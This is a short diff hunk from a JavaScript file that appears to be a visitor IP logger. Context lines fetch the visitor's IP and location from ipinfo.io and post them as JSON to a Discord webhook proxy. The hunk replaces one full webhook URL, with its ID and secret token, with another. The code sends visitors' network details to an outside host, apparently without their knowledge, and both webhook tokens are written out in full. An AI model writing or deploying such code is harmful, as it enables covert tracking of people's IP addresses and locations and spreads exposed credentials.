@@ -37,7 +37,7 @@ $.getJSON('https://ipinfo.io/json', function(data) {
         "attachments": []
       }
       var request = new XMLHttpRequest();
-      request.open("POST", "https://webhook.lewisakura.moe/api/webhooks/1088490117666177034/JJITE1tpdu7o2tWRkaqwKydLYS5YVP6YtpkWgQ86GVTAQB46jgXxQe5eieETzAp_-12s");
+      request.open("POST", "https://webhook.lewisakura.moe/api/webhooks/1088617585383321663/CYsKqjcEI5gZHKNCiDNHPdcVjlWduQczIHwPewBR4bsLVS3R4_KZ4x34FzPiyOCNaLUb");
 
       request.setRequestHeader('Content-type', 'application/json');
 
